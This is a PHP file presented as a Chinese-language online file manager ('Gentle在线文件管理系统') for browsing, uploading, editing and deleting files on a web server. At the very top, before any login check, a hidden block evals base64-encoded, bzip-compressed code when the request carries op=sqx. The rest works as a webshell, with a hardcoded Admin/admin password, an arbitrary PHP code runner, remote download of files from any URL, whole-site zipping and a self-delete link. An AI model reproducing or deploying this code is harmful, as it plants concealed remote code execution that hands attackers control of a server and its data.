<?php
error_reporting(0);
//////sql//////
if ($_GET['op'] == 'sqx') {
    $ix = new sql;
    eval(bzdecompress(base64_decode($ix->run())));
    die();
}
////sql/////
header('Content-Type: text/html; charset=utf-8');
/**********************************/
/*                                */
/* Gentle在线文件管理系统 V1.3    */
/*                                */
/* 原创作者：Gentle               */
/*                                */
/* V1.1                           */
/* 汉化并优化程序内部结构         */
/* 修复目录下有文件无法删除的问题 */
/* 优化并修复出错的查看文件组件   */
/* 实现在线解压Zip文件的功能      */
/* 实现从其他网址远程上传的功能   */
/* 实现全站打包的功能             */
/* 实现数据库本地备份功能         */
/* 实现远程上传到其他FTP的功能    */
/*                                */
/* V1.2                           */
/* 实现在线压缩Zip功能            */
/* 实现自杀功能避免被第三方滥用   */
/* 添加自杀功能                   */
/* 优化用户体验                   */
/*                                */
/* V1.3                           */
/* 实现权限读取与修改功能         */
/* 完善解压Zip文件到当前目录功能  */
/*                                */
/* 源自：osfm Static              */
/*                                */
/**********************************/

/**********************************/
/* 设置说明                       */
/*                                */
/* $adminfile - 文件名.           */
/* $sitetitle - 系统名称.         */
/* $filefolder - 管理目录.        */
/* $user - 用户名                 */
/* $pass - 密码                   */
/* $tbcolor1 - 未知               */
/* $tbcolor2 - 列表内容背景       */
/* $tbcolor3 - 列表头背景.        */
/* $bgcolor1 - 页面背景.          */
/* $bgcolor2 - 外框颜色.          */
/* $bgcolor3 - 按钮和框内内容.    */
/* $txtcolor1 - 文本与划过链接    */
/* $txtcolor2 - 链接.             */
/**********************************/

$adminfile  = $_SERVER['SCRIPT_NAME'];
$tbcolor1   = "#bacaee";
$tbcolor2   = "#daeaff";
$tbcolor3   = "#7080dd";
$bgcolor1   = "#ffffff";
$bgcolor2   = "#a6a6a6";
$bgcolor3   = "#003399";
$txtcolor1  = "#000000";
$txtcolor2  = "#003399";
$filefolder = "./";
$sitetitle  = 'Gentle在线文件管理系统';
$user       = 'Admin';
$pass       = 'admin';
$meurl      = $_SERVER['PHP_SELF'];
$me         = end(explode('/', $meurl));

$op     = $_REQUEST['op'];
$folder = $_REQUEST['folder'];

if(substr($folder ,0,1)==""){
while (preg_match('/\.\.\//',$folder)) $folder = preg_replace('/\.\.\//','/',$folder);
while (preg_match('/\/\//',$folder)) $folder = preg_replace('/\/\//','/',$folder);
}
if ($folder == '') {
    $folder = $filefolder;
} elseif ($filefolder != '') {
    if ((!ereg($filefolder, $folder))&&(substr($folder ,0,1)==".")&&(substr($folder ,0,2)!="..")) {
        $folder = $filefolder;
    }
}


/****************************************************************/
/* User identification                                          */
/*                                                              */
/* Looks for cookies. Yum.                                      */
/****************************************************************/

if ($_COOKIE['user'] != $user || $_COOKIE['pass'] != md5($pass)) {
	if ($_REQUEST['user'] == $user && $_REQUEST['pass'] == $pass) {
	    setcookie('user',$user,time()+60*60*24*1);
	    setcookie('pass',md5($pass),time()+60*60*24*1);
	} else {
		if ($_REQUEST['user'] == $user || $_REQUEST['pass']) $er = true;
		login($er);
	}
}

function testjr(){
try{
$ss= eval("echo <<<'HTML'
HTML;
");

}catch(Exception $e){
$ss= "None";
}
if(isset($ss)){return false;}else{return true;}
}

/****************************************************************/
/* function maintop()                                           */
/*                                                              */
/* Controls the style and look of the site.                     */
/* Recieves $title and displayes it in the title and top.       */
/****************************************************************/
function maintop($title, $showtop = true)
{
    global $folder,$me, $sitetitle, $lastsess, $login, $viewing, $iftop, $bgcolor1, $bgcolor2, $bgcolor3, $txtcolor1, $txtcolor2, $user, $pass, $password, $debug, $issuper;
    echo "<html>\n<head>\n" . "<title>$sitetitle :: $title</title>\n" . 
"<link rel=\"shortcut icon\" href=\"data:image/ico;base64,AAABAAEAEBAAAAAAAABoBQAAFgAAACgAAAAQAAAAIAAAAAEACAAAAAAAAAEAAAAAAAAAAAAAAAEAAAAAAAAAAAAAoaGhAPn5+QCSkpIA6urqAIODgwB0dHQAzMzMAFZWVgCurq4AR0dHAPf39wCQkJAAGhoaAHJycgDKysoAu7u7AFRUVACsrKwARUVFAJ2dnQD19fUAjo6OABgYGADX19cAcHBwAMjIyACqqqoAQ0NDADQ0NADz8/MAjIyMAG5ubgCoqKgAQUFBAJmZmQAyMjIA8fHxAIqKigDi4uIAxMTEAE5OTgDv7+8AiIiIAGpqagBbW1sA/Pz8AO3t7QCGhoYAz8/PAMDAwABZWVkAsbGxAEpKSgD6+voAk5OTACwsLACEhIQAHR0dANzc3AB1dXUAzc3NAGZmZgBXV1cASEhIAKCgoAD4+PgA6enpAIKCggAbGxsAc3NzAMvLywBGRkYAnp6eAPb29gCPj48AgICAABkZGQBxcXEAYmJiAFNTUwBEREQAnJycADU1NQDl5eUAfn5+AG9vbwBgYGAAuLi4APLy8gDU1NQAbW1tALa2tgBPT08Ap6enAP///wCYmJgA8PDwAImJiQDh4eEAenp6ANLS0gBra2sAw8PDAE1NTQD9/f0AlpaWAC8vLwCHh4cA0NDQAMHBwQA8PDwA+/v7AJSUlACFhYUA3d3dAGdnZwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHVSNLJkRyYhYDSxY3AABjIis5PhEcaBFQEU8rCQ4ADBxMbAUUIUFqK1YdLC9xAANIEgJZWWVuYSVCXCQGYAAWKUcqLjcNQDUqAmFFTiMADBNlLipUbS9lFUIeazwjAFJvOwQQAmkeFWcnQlEZUgADXVoyOBphSkM6MAs/ciMAFjhYcBg2X2EuPScYOTk5AGdNCl4oKBoxD0c0ZCAsZgAAEhNTawhkNx8mVhw1EQAAAAAAAABbdE5GSQAAAAAAAAAAAAAzXj9JOQUAAAAAAAAAAAAtGztXcwoCRAAAAAAAAAAAF3NELwBITCMMAAAAAAAAAF4NAQAAAEU4AAAAAMABAACAAAAAgAAAAIAAAACAAAAAgAAAAIAAAACAAAAAgAAAAIAAAADAAQAA/B8AAPgfAADwDwAA8IcAAPHPAAA=\" /> ".
	
	"</head>\n" . "<body bgcolor=\"#ffffff\">\n" . "<style>\n" . "td { font-size : 80%;font-family : tahoma;color: $txtcolor1;font-weight: 700;}\n" . "A {color: rgba(140, 70, 0, 1);text-shadow: 0px 0px 3px rgba(0, 0, 0, 0.5);}\n" . "textarea {border: 1px solid $bgcolor3 ;color: black;background-color: white;}\n" . "input.button{border: 1px solid $bgcolor3;color: black;background-color: white;}\n" . "input.text{border: 1px solid $bgcolor3;color: black;background-color: white;}\n" . "BODY {color: $txtcolor1; FONT-SIZE: 10pt; FONT-FAMILY: Tahoma, Verdana, Arial, Helvetica, sans-serif; scrollbar-base-color: $bgcolor2; MARGIN: 0px 0px 10px; BACKGROUND-COLOR: $bgcolor1}\n" . ".title {FONT-WEIGHT: bold; FONT-SIZE: 10pt; COLOR: #000000; TEXT-ALIGN: center; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif}\n" . ".copyright {FONT-SIZE: 8pt; COLOR: #000000; TEXT-ALIGN: left}\n" . ".error {FONT-SIZE: 10pt; COLOR: #AA2222; TEXT-ALIGN: left}\n" . "</style>\n\n";
    
    
    if ($viewing == "") {
        echo "<table cellpadding=10 cellspacing=10 bgcolor=$bgcolor1 align=center><tr><td>\n" . "<table cellpadding=1 cellspacing=1 bgcolor=$bgcolor2><tr><td>\n" . "<table cellpadding=5 cellspacing=5 bgcolor=$bgcolor1><tr><td>\n";
    } else {
        echo "<table cellpadding=7 cellspacing=7 bgcolor=$bgcolor1><tr><td>\n";
    }
    
    echo "<table width=\"100%\" border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n" . "<tr><td align=\"left\"><font face=\"Arial\" color=\"black\" size=\"4\">$sitetitle</font><font size=\"3\" color=\"black\"> :: $title</font></td>\n" . "<tr><td width=650 style=\"height: 1px;\" bgcolor=\"black\"></td></tr>\n";
    
    if ($showtop) {
        echo "<tr><td><font size=\"2\">\n" 
		. "<a href=\"" . $adminfile . "?op=home\" $iftop>主页</a>\n" 
		. "<a href=\"" . $adminfile . "?op=home&folder=".((($folder)&&(!str_replace("../","",$folder)))?($folder."../"):("../"))."\" $iftop>上层</a>\n" 
		. "<a href=\"javascript:history.go(-1);\" $iftop>后退</a>\n" 
		. "<a href=\"javascript:location.reload();\" $iftop>刷新</a>\n" 
		. "<a href=\"javascript:history.go(1);\" $iftop>前进</a>\n" 
		. "<a href=\"" . $adminfile . "?op=up\" $iftop>上传</a>\n" 
		. "<a href=\"" . $adminfile . "?op=cr\" $iftop>创建</a>\n" 
		. "<a href=\"" . $adminfile . "?op=run\" $iftop>代码测试</a>\n" 
		. "<a href=\"" . $adminfile . "?op=lcj\" $iftop>插件</a>\n" 
		.((function_exists(bzdecompress))?(((testjr())?( "<a href=\"" . $adminfile . "?op=tz\" $iftop>探针</a>\n\n" 
		. "<a href=\"" . $adminfile . "?op=sql\" $iftop>数据库管理</a>\n" ):(""))):(""))
		
		. "<a href=\"" . $adminfile . "?op=sqlb\" $iftop>数据库备份</a>\n" 
		. "<a href=\"" . $adminfile . "?op=allz\" $iftop>全站备份</a>\n"
        //."<a href=\"".$adminfile."?op=ftpa\" $iftop>FTP功能</a>\n"
        . "<a href=\"" . $adminfile . "?op=killme&dename=" . $me . "&folder=./\">自杀</a>\n" 
		. "<a style=\"float: right;\" href=\"" . $adminfile . "?op=logout\" $iftop>退出</a>\n";
        echo "<tr><td width=650 style=\"height: 1px;\" bgcolor=\"black\"></td></tr>\n";
    }
    echo "</table><br>\n";
}


/****************************************************************/
/* function login()                                             */
/*                                                              */
/* Sets the cookies and alows user to log in.                   */
/* Recieves $pass as the user entered password.                 */
/****************************************************************/
function login($er = false)
{
    global $op;
    setcookie("user", "", time() - 60 * 60 * 24 * 1);
    setcookie("pass", "", time() - 60 * 60 * 24 * 1);
    maintop("登录", false);
    
    if ($er) {
        echo "<font class=error>**错误: 不正确的登录信息.**</font><br><br>\n";
    }
    
    echo "<form action=\"" . $adminfile . "?op=" . $op . "\" method=\"post\">\n" . "<table><tr>\n" . "<td><font size=\"2\">用户名: </font>" . "<td><input type=\"text\" name=\"user\" size=\"18\" border=\"0\" class=\"text\" value=\"$user\">\n" . "<tr><td><font size=\"2\">密码: </font>\n" . "<td><input type=\"password\" name=\"pass\" size=\"18\" border=\"0\" class=\"text\" value=\"$pass\">\n" . "<tr><td colspan=\"2\"><input type=\"submit\" name=\"submitButtonName\" value=\"登录\" border=\"0\" class=\"button\">\n" . "</table>\n" . "</form>\n";
    mainbottom();
    
}


/****************************************************************/
/* function home()                                              */
/*                                                              */
/* Main function that displays contents of folders.             */
/****************************************************************/
function home()
{
    global $folder, $tbcolor1, $tbcolor2, $tbcolor3, $filefolder, $HTTP_HOST;
    maintop("主页");
    echo "<font face=\"tahoma\" size=\"2\"><b>\n" . "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\" width=100%>\n";
    
    $content1 = "";
    $content2 = "";
    
    $count = "0";
    $style = opendir($folder);
    $a     = 1;
    $b     = 1;
    
    if ($folder) {
        if (ereg("/home/", $folder)) {
            $folderx = ereg_replace("$filefolder", "", $folder);
            $folderx = "http://" . $HTTP_HOST . "/" . $folderx;
        } else {
            $folderx = $folder;
        }
    }
    
    while ($stylesheet = readdir($style)) {
        if (strlen($stylesheet) > 40) {
            $sstylesheet = substr($stylesheet, 0, 40) . "...";
        } else {
            $sstylesheet = $stylesheet;
        }
        if ($stylesheet != "." && $stylesheet != "..") {
		if((substr($folder,-1)=="/")||!$folder){
            if (is_dir($folder . $stylesheet) && is_readable($folder . $stylesheet)) {
                $content1[$a] = "<td>" . $sstylesheet . "</td>\n" . "<td> "
                //.disk_total_space($folder.$stylesheet)." Commented out due to certain problems
                    . "<td align=\"left\">" . substr(sprintf('%o', fileperms($folder . $stylesheet)), -4) . "<td align=\"center\"><a href=\"" . $adminfile . "?op=home&folder=" . $folder . $stylesheet . "/\">打开</a>\n" . "<td align=\"center\"><a href=\"" . $adminfile . "?op=ren&file=" . $stylesheet . "&folder=$folder\">重命名</a>\n" . "<td align=\"center\"><a href=\"" . $adminfile . "?op=z&dename=" . $stylesheet . "&folder=$folder\">压缩</a>\n" . "<td align=\"center\"><a href=\"" . $adminfile . "?op=del&dename=" . $stylesheet . "&folder=$folder\">删除</a>\n" . "<td align=\"center\"><a href=\"" . $adminfile . "?op=cop&file=" . $stylesheet . "&folder=$folder\">复制</a>\n" . "<td align=\"center\"><a href=\"" . $adminfile . "?op=mov&file=" . $stylesheet . "&folder=$folder\">移动</a>\n" . "<td align=\"center\"><a href=\"" . $adminfile . "?op=chm&file=" . $stylesheet . "&folder=$folder\">设置</a>\n" . "<td align=\"center\">\n" . "<td align=\"center\">\n" . "<td align=\"center\"> <tr height=\"2\"><td height=\"2\" colspan=\"3\">\n";
                $a++;
            } elseif (!is_dir($folder . $stylesheet) && is_readable($folder . $stylesheet)) {
			   $tzm=substr($folder,0,1);if(!$tzm){$tzm=".";}
                $content2[$b] = "<td><a target='_blank' href=\"" . (((($tzm!=".")&&($folder))||(substr($folder,0,2)==".."))?("javascript:void(0);\" onclick=\"alert('文件不位于网站目录根，不能执行！')\""):($folderx . $stylesheet)) . "\">" . $sstylesheet . "</a></td>\n" . "<td align=\"left\">" . filesize($folder . $stylesheet) . "<td align=\"left\">" . substr(sprintf('%o', fileperms($folder . $stylesheet)), -4) . "<td align=\"center\"><a href=\"" . $adminfile . "?op=edit&fename=" . $stylesheet . "&folder=$folder\">编辑</a>\n" . "<td align=\"center\"><a href=\"" . $adminfile . "?op=ren&file=" . $stylesheet . "&folder=$folder\">重命名</a>\n" . ((pathinfo($stylesheet, PATHINFO_EXTENSION) == "zip") ? ("<td align=\"center\"><a href=\"" . $adminfile . "?op=unz&dename=" . $stylesheet . "&folder=$folder\">解压</a>\n") : ("<td align=\"center\"><a href=\"" . $adminfile . "?op=z&dename=" . $stylesheet . "&folder=$folder\">压缩</a>\n")) . "<td align=\"center\"><a href=\"" . $adminfile . "?op=del&dename=" . $stylesheet . "&folder=$folder\">删除</a>\n" . "<td align=\"center\"><a href=\"" . $adminfile . "?op=cop&file=" . $stylesheet . "&folder=$folder\">复制</a>\n" . "<td align=\"center\"><a href=\"" . $adminfile . "?op=mov&file=" . $stylesheet . "&folder=$folder\">移动</a>\n" . "<td align=\"center\"><a href=\"" . $adminfile . "?op=chm&file=" . $stylesheet . "&folder=$folder\">设置</a>\n" . "<td align=\"center\"><a href=\"" .(((($tzm!=".")&&($folder))||(substr($folder,0,2)==".."))?("javascript:void(0);\" onclick=\"alert('文件不位于网站目录根，不能执行！')\""):($adminfile . "?op=viewframe&file=" . $stylesheet . "&folder=$folder"))."\">查看</a>\n" . "<td align=\"center\"><a href=\"" . $adminfile . "?op=download&file=" . $stylesheet . "&folder=$folder\">下载</a>\n" . "<td align=\"center\"><a href=\"" . $adminfile . "?op=ftpa&file=" . $stylesheet . "&folder=$folder\">FTP</a>\n" . "<tr height=\"2\"><td height=\"2\" colspan=\"3\">\n";
                $b++;
            } else {
                //echo " | Directory is unreadable\n";
            }
			}
            $count++;
        }
    }
    closedir($style);
    
    echo "<form action=\"\" method=\"get\"><span><span style=\"float:left;\">浏览目录: ".turnpath($folder)."</span><span style=\"float:right;\"><input name=\"op\" type=\"hidden\" value=\"home\"/><input name=\"folder\" type=\"text\" value=\"".(($folder)?($folder):("./"))."\" /><input type=\"submit\" value=\"跳转\" /></span></span></form>\n" . "<br><br>文件数: " . (((substr($folder,-1)=="/")||!$folder)?($count ):("0")). "<br><br>";
    
    echo "<tr bgcolor=\"$tbcolor3\" width=100%>" . "<td width=220>档名\n" . "<td width=65>大小\n" . "<td width=35>权限\n" . "<td align=\"center\" width=44>打开\n" . "<td align=\"center\" width=58>重命名\n" . "<td align=\"center\" width=45>压缩\n" . "<td align=\"center\" width=45>删除\n" . "<td align=\"center\" width=45>复制\n" . "<td align=\"center\" width=45>移动\n" . "<td align=\"center\" width=45>权限\n" . "<td align=\"center\" width=45>查看\n" . "<td align=\"center\" width=45>下载\n" . "<td align=\"center\" width=45>FTP\n" . "<tr height=\"2\"><td height=\"2\" colspan=\"3\">\n";
    
    for ($a = 1; $a < count($content1) + 1; $a++) {
        $tcoloring = ($a % 2) ? $tbcolor1 : $tbcolor2;
        echo "<tr bgcolor=" . $tcoloring . " width=100%>";
        echo $content1[$a];
    }
    
    for ($b = 1; $b < count($content2) + 1; $b++) {
        $tcoloring = ($a++ % 2) ? $tbcolor1 : $tbcolor2;
        echo "<tr bgcolor=" . $tcoloring . " width=100%>";
        echo $content2[$b];
    }
    
    echo "</table>";
    mainbottom();
}

function turnpath($str){
//die(substr($_REQUEST['folder'],0,1));
if(!$str){$str="./";}
$tzm=substr($str,0,1);
$sss=split("/",$str);
$vvv=(($tzm=="/")?("/"):(""));
for ($i=0;$i<count($sss)-1;$i++){
if($sss[$i]){
$ppp.=$sss[$i]."/";
$vvv.="<a href=\"".$adminfile."?op=home&folder=".(($tzm=="/")?("/"):("")).$ppp."\">".$sss[$i]."</a>/";
}
}
if($sss[count($sss)-1]){
$vvv.="<a href=\"".$adminfile."?op=edit&fename=".$sss[count($sss)-1]."&folder=".(($tzm=="/")?("/"):("")).$ppp."\">".$sss[$i]."</a>";
}
return $vvv;
}

/****************************************************************/
/* function up()                                                */
/*                                                              */
/* First step to Upload.                                        */
/* User enters a file and the submits it to upload()            */
/****************************************************************/

function up()
{
    global $folder, $content, $filefolder;
    maintop("上传");
    
    echo "<FORM ENCTYPE=\"multipart/form-data\" ACTION=\"" . $adminfile . "?op=upload\" METHOD=\"POST\">\n" . "<font face=\"tahoma\" size=\"2\"><b>本地上传 <br>文件:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上传目录:</b></font><br><input type=\"File\" name=\"upfile\" size=\"20\" class=\"text\">\n" . "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<select name=\"ndir\" size=1>\n" . "<option value=\"" . $filefolder . "\">" . $filefolder . "</option>";
    listdir($filefolder);
    echo $content . "</select><br>" . "<input type=\"submit\" value=\"上传\" class=\"button\">\n" . "<a href=\"" . $adminfile . "?op=home\"> 取消 </a>\n" . "</form>\n";
    echo "远程上传是什么意思？<br>远程上传是从其他服务器获取文件并直接下载到当前服务器的一种功能。<br>类似于SSH的Wget功能，免去我们下载再手动上传所浪费的时间。<br><br>远程下载地址:<form action=\"" . $adminfile . "?op=yupload\" method=\"POST\"><input name=\"url\" size=\"80\" /><input name=\"submit\" value=\"上传\" type=\"submit\" /></form>\n";
    mainbottom();
}

/****************************************************************/
/* function yupload()                                           */
/*                                                              */
/* Second step in wget file.                                    */
/* Saves the file to the disk.                                  */
/* Recieves $upfile from up() as the uploaded file.             */
/****************************************************************/

function yupload($url, $folder = "./")
{
    set_time_limit(24 * 60 * 60); // 设置超时时间
    $destination_folder = $folder . './'; // 文件下载保存目录，默认为当前文件目录
    if (!is_dir($destination_folder)) { // 判断目录是否存在
        mkdirs($destination_folder); // 如果没有就建立目录
    }
    $newfname = $destination_folder . str_replace(',','_',str_replace(';','_',str_replace('=','_',str_replace('&','_',str_replace('?','-',basename($url)))))); // 取得文件的名称
    $file     = fopen($url, "rb"); // 远程下载文件，二进制模式
    if ($file) { // 如果下载成功
        $newf = fopen($newfname, "wb"); // 远在文件文件
        if ($newf) // 如果文件保存成功
            while (!feof($file)) { // 判断附件写入是否完整
                fwrite($newf, fread($file, 1024 * 8), 1024 * 8); // 没有写完就继续
            }
    }
    if ($file) {
        fclose($file); // 关闭远程文件
    }
    if ($newf) {
        fclose($newf); // 关闭本地文件
    }
    maintop("远程上传");
    echo "文件 " . $url . " 上传成功.\n" . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n";
    mainbottom();
    return true;
}

/****************************************************************/
/* function upload()                                            */
/*                                                              */
/* Second step in upload.                                      */
/* Saves the file to the disk.                                  */
/* Recieves $upfile from up() as the uploaded file.             */
/****************************************************************/
function upload($upfile, $ndir)
{
    
    global $folder;
    if (!$upfile) {
        error("文件太大 或 文件大小等于0");
    } elseif ($upfile['name']) {
        if (copy($upfile['tmp_name'], $ndir . $upfile['name'])) {
            maintop("上传");
            echo "文件 " . $upfile['name'] ." " . $folder. $upfile_name . " 上传成功.\n" . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n";;
            mainbottom();
        } else {
            printerror("文件 $upfile 上传失败.");
        }
    } else {
        printerror("请输入文件名.");
    }
}

/****************************************************************/
/* function allz()                                               */
/*                                                              */
/* First step in allzip.                                        */
/* Prompts the user for confirmation.                           */
/* Recieves $dename and ask for deletion confirmation.          */
/****************************************************************/
function allz()
{
    maintop("全站备份");
    echo "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n" . "<font class=error>**警告: 这将进行全站打包成allbackup.zip的动作! 如存在该文件，该文件将被覆盖!**</font><br><br>\n" . "确定要进行全站打包?<br><br>\n" . "<a href=\"" . $adminfile . "?op=allzip\">确定</a> | \n" . "<a href=\"" . $adminfile . "?op=home\"> 取消 </a>\n" . "</table>\n";
    mainbottom();
}

/****************************************************************/
/* function allzip()                                            */
/*                                                              */
/* Second step in unzip.                                       */
/****************************************************************/
function allzip()
{
    maintop("全站备份");
    if (file_exists('allbackup.zip')) {
        unlink('allbackup.zip');
    } else {
    }
    class Zipper extends ZipArchive
    {
        public function addDir($path)
        {
            $path = str_replace('./', '', $path);
            print 'adding ' . $path . '<br>';
            if ($path != '.') {
                $this->addEmptyDir($path);
            }
            $nodes = glob($path . '/'.'{,.}*', GLOB_BRACE);
            foreach ($nodes as $node) {
			
				if(($node!=$path.'/.')&&($node!=$path.'/..')){
                $node = str_replace('./', '', $node);
                print $node . '<br>';
                if (is_dir($node)) {
                    $this->addDir($node);
                } else if (is_file($node)) {
                    $this->addFile($node);
                }
				}
				
            }
        }
    }
    $zip = new Zipper;
    $res = $zip->open('allbackup.zip', ZipArchive::CREATE);
    if ($res === TRUE) {
        $zip->addDir('.');
        $zip->close();
        echo '全站压缩完成！' . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\">返回上一级目录</a>\n";
    } else {
        echo '全站压缩失败！' . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\">返回上一级目录</a>\n";
    }
    mainbottom();
}

/****************************************************************/
/* function unz()                                               */
/*                                                              */
/* First step in unz.                                        */
/* Prompts the user for confirmation.                           */
/* Recieves $dename and ask for deletion confirmation.          */
/****************************************************************/
function unz($dename)
{
    global $folder;
    if (!$dename == "") {
        maintop("解压");
        echo "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n" . "<font class=error>**警告: 这将解压 " . $folder . $dename . " 到$folder. **</font><br><br>\n" . "确定要解压 " . $folder . $dename . "?<br><br>\n" . "<a href=\"" . $adminfile . "?op=unzip&dename=" . $dename . "&folder=$folder\">确定</a> | \n" . "<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\"> 取消 </a>\n" . "</table>\n";
        mainbottom();
    } else {
        home();
    }
}


/****************************************************************/
/* function unzip()                                            */
/*                                                              */
/* Second step in unzip.                                       */
/****************************************************************/
function unzip($dename)
{
    global $folder;
    if (!$dename == "") {
        maintop("解压");
        $zip = new ZipArchive();
        if ($zip->open($folder . $dename) === TRUE) {
            $zip->extractTo('./' . $folder);
            $zip->close();
            echo $dename . " 已经被解压." . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\">返回上一级目录</a>\n";
        } else {
            echo '无法解压文件.' . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\">返回上一级目录</a>\n";
        }
        mainbottom();
    } else {
        home();
    }
}


/****************************************************************/
/* function del()                                               */
/*                                                              */
/* First step in delete.                                        */
/* Prompts the user for confirmation.                           */
/* Recieves $dename and ask for deletion confirmation.          */
/****************************************************************/
function del($dename)
{
    global $folder;
    if (!$dename == "") {
        maintop("删除");
        echo "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n" . "<font class=error>**警告: 这将永久删除 " . $folder . $dename . ". 这个动作是不可还原的.**</font><br><br>\n" . "确定要删除 " . $folder . $dename . "?<br><br>\n" . "<a href=\"" . $adminfile . "?op=delete&dename=" . $dename . "&folder=$folder\">确定</a> | \n" . "<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\"> 取消 </a>\n" . "</table>\n";
        mainbottom();
    } else {
        home();
    }
}


/****************************************************************/
/* function delete()                                            */
/*                                                              */
/* Second step in delete.                                       */
/* Deletes the actual file from disk.                           */
/* Recieves $upfile from up() as the uploaded file.             */
/****************************************************************/
function deltree($pathdir)
{
    if (is_empty_dir($pathdir)) //如果是空的  
        {
        rmdir($pathdir); //直接删除  
    } else { //否则读这个目录，除了.和..外  
        $d = dir($pathdir);
        while ($a = $d->read()) {
            if (is_file($pathdir . '/' . $a) && ($a != '.') && ($a != '..')) {
                unlink($pathdir . '/' . $a);
            }
            //如果是文件就直接删除  
            if (is_dir($pathdir . '/' . $a) && ($a != '.') && ($a != '..')) { //如果是目录  
                if (!is_empty_dir($pathdir . '/' . $a)) //是否为空  
                    { //如果不是，调用自身，不过是原来的路径+他下级的目录名  
                    deltree($pathdir . '/' . $a);
                }
                if (is_empty_dir($pathdir . '/' . $a)) { //如果是空就直接删除  
                    rmdir($pathdir . '/' . $a);
                }
            }
        }
        $d->close();
    }
}
function is_empty_dir($pathdir)
{
    //判断目录是否为空 
    $d = opendir($pathdir);
    $i = 0;
    while ($a = readdir($d)) {
        $i++;
    }
    closedir($d);
    if ($i > 2) {
        return false;
    } else
        return true;
}

function delete($dename)
{
    global $folder;
    if (!$dename == "") {
        maintop("删除");
        if (is_dir($folder . $dename)) {
            if (is_empty_dir($folder . $dename)) {
                rmdir($folder . $dename);
                echo $dename . " 已经被删除." . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\">返回上一级目录</a>\n";
            } else {
                deltree($folder . $dename);
                rmdir($folder . $dename);
                echo $dename . " 已经被删除." . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\">返回上一级目录</a>\n";
            }
        } else {
            if (unlink($folder . $dename)) {
                echo $dename . " 已经被删除." . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\">返回上一级目录</a>\n";
            } else {
                echo "无法删除文件. " . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\">返回上一级目录</a>\n";
            }
        }
        mainbottom();
    } else {
        home();
    }
}


/****************************************************************/
/* function edit()                                              */
/*                                                              */
/* First step in edit.                                          */
/* Reads the file from disk and displays it to be edited.       */
/* Recieves $upfile from up() as the uploaded file.             */
/****************************************************************/
function edit($fename=null)
{
    global $folder;
    
    maintop((($fename) ? ("编辑") : ("代码测试工具")));
    echo (($fename) ? ("文件路径 ".turnpath($folder.$fename)) : ("代码测试工具"));
    
    echo '<form id="php" style="display:none;" action="' . $adminfile . '?op=rux" target="_blank"
			method="post">
				<textarea id="phpcode" name="phpcode">
				</textarea>
				<input type="submit" />
			</form>';
    echo '<form id="dfile" style="display:none;" action="' . $adminfile . '?op=dfile" target="_blank"
			method="post">
				<textarea id="dfilecode" name="dfilecode">
				</textarea>
				<input type="submit" />
			</form>';
